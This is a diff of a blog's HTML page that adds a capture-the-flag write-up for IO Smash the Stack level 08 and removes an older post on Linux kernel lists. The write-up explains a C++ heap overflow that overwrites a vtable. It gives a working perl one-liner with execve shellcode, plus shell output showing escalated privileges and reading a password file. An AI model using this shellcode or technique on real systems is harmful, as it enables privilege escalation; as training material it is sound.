@@ -36,7 +36,7 @@
 </head>
 
 
-  <body>
+  <body class="theme-base-0d">
 
     <div class="sidebar">
   <div class="container sidebar-sticky">
@@ -62,16 +62,20 @@
       
         
           
-            <a class="sidebar-nav-item" href="/about.html">About</a>
+            <a class="sidebar-nav-item" href="/about">About</a>
           
         
       
         
           
-            <a class="sidebar-nav-item" href="/archive.html">Archive</a>
+            <a class="sidebar-nav-item" href="/archive">Archive</a>
           
         
       
+        
+      
+        
+          
         
       
         
@@ -98,13 +102,154 @@
       <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
     </nav>
 
-    <p>&copy; 2015. All rights reserved.</p>
+    <p>&copy; 2016. All rights reserved.</p>
   </div>
 </div>
 
 
     <div class="content container">
       <div class="posts">
+  
+  <div class="post">
+    <h1 class="post-title">
+      <a href="/posts/level08smash">
+        Level 08 I/O Smash the Stack
+      </a>
+    </h1>
+
+    <span class="post-date">09 Feb 2015</span>
+
+    <p>Finally I got some time to write. I am going to try to summarize the process which I have had to pass to resolve the smash&#39;s level08.</p>
+
+<p>The code for this exercise is the following.</p>
+<div class="highlight"><pre><code class="language-C++" data-lang="C++"> <span class="c1">// writen by bla for io.smashthestack.org</span>
+<span class="cp">#include &lt;iostream&gt;</span>
+<span class="cp">#include &lt;cstring&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+
+<span class="k">class</span> <span class="nc">Number</span>
+<span class="p">{</span>
+        <span class="k">public</span><span class="o">:</span>
+                <span class="n">Number</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">)</span> <span class="o">:</span> <span class="n">number</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">{}</span>
+                <span class="kt">void</span> <span class="n">setAnnotation</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span><span class="n">memcpy</span><span class="p">(</span><span class="n">annotation</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">a</span><span class="p">));}</span>
+                <span class="k">virtual</span> <span class="kt">int</span> <span class="k">operator</span><span class="o">+</span><span class="p">(</span><span class="n">Number</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">number</span><span class="p">;}</span>
+        <span class="k">private</span><span class="o">:</span>
+                <span class="kt">char</span> <span class="n">annotation</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+                <span class="kt">int</span> <span class="n">number</span><span class="p">;</span>
+<span class="p">};</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+        <span class="n">Number</span> <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+        <span class="n">Number</span> <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Number</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span>
+        <span class="n">Number</span> <span class="o">&amp;</span><span class="n">five</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">six</span> <span class="o">=</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
+
+        <span class="n">five</span><span class="p">.</span><span class="n">setAnnotation</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+        <span class="k">return</span> <span class="n">six</span> <span class="o">+</span> <span class="n">five</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>It is clear how the use of <code>memcpy</code> is insecure due to there is not sanitation on the argv[1] so we can write beyond the capacity of the member variable <code>annotation</code>.</p>
+
+<p>To see if this fact is exploitable we need to figure out how is the layout of the class on memory. C++ classes are very similar with C’s structs. That means that the layout would be.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">AAAAAAAAAAAAAAAAAAAANNNN
+
+where:
+A -&gt; bytes of annotation
+N -&gt; bytes of number
+</code></pre></div>
+<p>But in this case we have an extra pointer which is normally known as <code>vtable</code>. So the layout would be as follows.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">PPPPAAAAAAAAAAAANNNN
+where:
+P-&gt; pointer of vtable
+A-&gt; bytes of annotation
+N-&gt; bytes of number
+</code></pre></div>
+<p>What is the goal of vtable in C++? This can be viewed as dynamic binding since is the way C++ resolve calls when the inheritances come out. The following <a href="http://phrack.org/issues/56/8.html">example</a>  try to explain the concept.</p>
+<div class="highlight"><pre><code class="language-C++" data-lang="C++"><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+
+<span class="k">class</span> <span class="nc">BaseClass</span>
+<span class="p">{</span>
+    <span class="k">private</span><span class="o">:</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="k">public</span><span class="o">:</span>
+        <span class="kt">void</span> <span class="n">SetBuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">String</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">strcpy</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span><span class="n">String</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">,</span><span class="n">Buffer</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="k">class</span> <span class="nc">MyClass1</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
+<span class="p">{</span>
+    <span class="k">public</span><span class="o">:</span>
+        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass1</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
+            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="k">class</span> <span class="nc">MyClass2</span><span class="o">:</span><span class="k">public</span> <span class="n">BaseClass</span>
+<span class="p">{</span>
+    <span class="k">public</span><span class="o">:</span>
+        <span class="kt">void</span> <span class="n">PrintBuffer</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="nl">MyClass2</span><span class="p">:</span> <span class="err">“</span><span class="p">);</span>
+            <span class="n">BaseClass</span><span class="o">::</span><span class="n">PrintBuffer</span><span class="p">();</span>
+        <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">BaseClass</span> <span class="o">*</span><span class="n">Object</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+
+    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass1</span><span class="p">;</span>
+    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyClass2</span><span class="p">;</span> 
+
+    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string1</span><span class="err">”</span><span class="p">);</span>
+    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">SetBuffer</span><span class="p">(</span><span class="err">“</span><span class="n">string2</span><span class="err">”</span><span class="p">);</span>
+    <span class="n">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
+    <span class="n">Object</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">PrintBuffer</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">example</span>
+<span class="nl">MyClass1</span><span class="p">:</span> <span class="n">string1</span>
+<span class="nl">MyClass2</span><span class="p">:</span> <span class="n">string2</span>
+</code></pre></div>
+<p>What’s going on here? Thanks to vtable the runtime can resolve which method should call. Vtable how we have said before has been created to support dynamic binding or dynamic dispatch. It is an array of functions. This functions will be set at runtime to point to the correct function to be called. That is why the Object[0] knows that when it needs to call the member function <code>PrintBuffer</code>, it must call the MyClass1’s function instead of BaseClass’s. The same happens with Object[1].</p>
+
+<p>If in somehow we can overwrite the vtable we can hijack the flow of our program to execute arbitrary code. That is the problem of the code that we showed at the beginning. </p>
+
+<p>When we call <code>setAnnotation</code> on <code>five</code>, which is a reference to <code>x</code>, we are able to write beyond its space since we are using memcpy without sanitation. We overwrite <code>six</code> memory space, since it is after the five’s memory; with the consequence to overwrite vtable. After that, when the statement <code>return six + five</code> is called, that in reality is called <code>return six.operator+(five)</code>, the runtime look through the <code>vtable</code> to know the correct function to call. This is when the buffer overflow; that happens on the heap since the classes are created using <code>new</code>, can be exploited.</p>
+
+<p>If we use gdb we can see the layout of the memory.</p>
+
+<p><img src="/public/images/level8-1.png" alt="level8-1"></p>
+
+<p>We have to write our shellcode in <code>annotation</code> and then rewrite the six’s vtable to redirect it to our shellcode. Finally to exploit this we need to execute the following.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">/levels/level08 <span class="sb">`</span>perl -e ‘print “<span class="se">\x</span>10<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>17<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>89<span class="se">\x</span>d8<span class="se">\x</span>b0<span class="se">\x</span>2e<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>cd<span class="se">\x</span>80”,”A”x56,”<span class="se">\x</span>0c<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="sb">`</span>
+
+sh-4.2<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1009<span class="o">(</span>level9<span class="o">)</span>,1008<span class="o">(</span>level8<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
+sh-4.2<span class="nv">$ </span>cat /home/level9/.pass
+XXXXXXXXXXX
+</code></pre></div>
+<p>Write a shellcode is a difficult task in which I have to go deeper. This exercise has been very helpful to understand the danger of vtable on C++ and how the classes are represented in memory. We must be careful when we develop software since you never know where the danger resides.</p>
+
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&text=Level 08 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
   
   <div class="post">
     <h1 class="post-title">
@@ -256,92 +401,6 @@ sh-4.2<span class="err">$</span>
 </code></pre></div>
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&text=Level 06 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/doublylist">
-        How Linux Implements Generic List
-      </a>
-    </h1>
-
-    <span class="post-date">18 Dec 2014</span>
-
-    <p>I was reading <a href="http://shop.oreilly.com/product/9780596005658.do">Understanding the Linux Kernel</a> about how each process is represented through <code>task_struct</code> and so on. The kernel uses a lot of struct to represent different kind of data and it uses lists to manage relationship between them. It would be a waste of time that for each kind of struct was necessary develop a new list, functions to handle it … etc. To resolve this, Linux makes use of a generic list. The idea is as follows.</p>
-
-<p><img src="/public/images/linked-list.png" alt="linked-list"></p>
-
-<p>If you want that your struct be in a list all what you have to do is include a <code>list_head</code> inside it. <code>list_head</code> is defined as follows (I am using the source code of Linux 2.6.0).</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
-    <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">,</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
-<span class="p">};</span>
-</code></pre></div>
-<p>Where <code>next</code> and <code>prev</code> point to the next and previous element in the list respectively. The first question that has came to me is how are we able to get the pointer to the real struct if we only have a pointer to <code>list_head</code>?. The solution provided by Linux is very clever. Before to know is better to have better context about a real struct used by Linux as <code>task_struct</code>.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
-    <span class="k">volatile</span> <span class="kt">long</span> <span class="n">state</span><span class="p">;</span>    <span class="cm">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span>
-    <span class="k">struct</span> <span class="n">thread_info</span> <span class="o">*</span><span class="n">thread_info</span><span class="p">;</span>
-    <span class="kt">atomic_t</span> <span class="n">usage</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>    <span class="cm">/* per process flags, defined below */</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace</span><span class="p">;</span>
-
-    <span class="kt">int</span> <span class="n">lock_depth</span><span class="p">;</span>     <span class="cm">/* Lock depth */</span>
-
-    <span class="kt">int</span> <span class="n">prio</span><span class="p">,</span> <span class="n">static_prio</span><span class="p">;</span>
-    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">run_list</span><span class="p">;</span>
-    <span class="kt">prio_array_t</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
-
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sleep_avg</span><span class="p">;</span>
-    <span class="kt">long</span> <span class="n">interactive_credit</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">timestamp</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">activated</span><span class="p">;</span>
-
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">policy</span><span class="p">;</span>
-    <span class="kt">cpumask_t</span> <span class="n">cpus_allowed</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">time_slice</span><span class="p">,</span> <span class="n">first_time_slice</span><span class="p">;</span>
-
-    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">tasks</span><span class="p">;</span>
-
-    <span class="cm">/* there are more types*/</span>
-  <span class="p">.</span> <span class="p">.</span> <span class="p">.</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>You can see how inside the <code>task_struct</code> has a member whose name is <code>task</code> of type <code>list_head</code>. This is used to track each process that run inside the kernel so through this member we can  retrieve all the process. There is a macro inside the Linux Kernel to run through all the process.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#define next_task(p)    list_entry((p)-&gt;tasks.next, struct task_struct, tasks)</span>
-
-<span class="cp">#define for_each_process(p) \</span>
-<span class="cp">    for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task ; )</span>
-</code></pre></div>
-<p>In <code>list_entry</code> is where we are going to get in this case the pointer to <code>task_struct</code>.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cm">/**</span>
-<span class="cm"> * list_entry - get the struct for this entry</span>
-<span class="cm"> * @ptr:    the &amp;struct list_head pointer.</span>
-<span class="cm"> * @type:   the type of the struct this is embedded in.</span>
-<span class="cm"> * @member: the name of the list_struct within the struct.</span>
-<span class="cm"> */</span>
-<span class="cp">#define list_entry(ptr, type, member) \</span>
-<span class="cp">    container_of(ptr, type, member)</span>
-
-<span class="o">**</span>
- <span class="o">*</span> <span class="n">container_of</span> <span class="o">-</span> <span class="n">cast</span> <span class="n">a</span> <span class="n">member</span> <span class="n">of</span> <span class="n">a</span> <span class="n">structure</span> <span class="n">out</span> <span class="n">to</span> <span class="n">the</span> <span class="n">containing</span> <span class="n">structure</span>
- <span class="o">*</span>
- <span class="o">*</span> <span class="err">@</span><span class="nl">ptr</span><span class="p">:</span>    <span class="n">the</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">the</span> <span class="n">member</span><span class="p">.</span>
- <span class="o">*</span> <span class="err">@</span><span class="nl">type</span><span class="p">:</span>   <span class="n">the</span> <span class="n">type</span> <span class="n">of</span> <span class="n">the</span> <span class="n">container</span> <span class="k">struct</span> <span class="n">this</span> <span class="n">is</span> <span class="n">embedded</span> <span class="n">in</span><span class="p">.</span>
- <span class="o">*</span> <span class="err">@</span><span class="nl">member</span><span class="p">:</span> <span class="n">the</span> <span class="n">name</span> <span class="n">of</span> <span class="n">the</span> <span class="n">member</span> <span class="n">within</span> <span class="n">the</span> <span class="k">struct</span><span class="p">.</span>
- <span class="o">*</span>
- <span class="err">*/</span>
-<span class="cp">#define container_of(ptr, type, member) ({          \</span>
-<span class="cp">        const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);    \</span>
-<span class="cp">        (type *)( (char *)__mptr - offsetof(type,member) );})</span>
-</code></pre></div>
-<p>The magic really happens in <code>container_of</code> and is really simple. The first line declares <code>__mptr</code> equal to the type of the <code>member</code> inside the <code>type</code> and is assigned <code>ptr</code> that in our case would be <code>task</code> of the actual process. The second line   subtract the address of <code>__mptr</code> the offset between the <code>task_struct</code> and the member <code>task</code>, thanks to that you are able to get a reference to the <code>task_struct</code> through <code>task</code>.</p>
-
-<p>Maybe is a little bit confusing at the beginning but once you get used to it, is very useful since you can apply the same idea to your projects. You should check this out <a href="https://github.com/torvalds/linux/blob/master/include/linux/list.h">/include/linux/list.h</a> and seeing the rest of the functions that Linux uses to manipulate list.</p>
-
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/doublylist&text=How Linux Implements Generic List&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
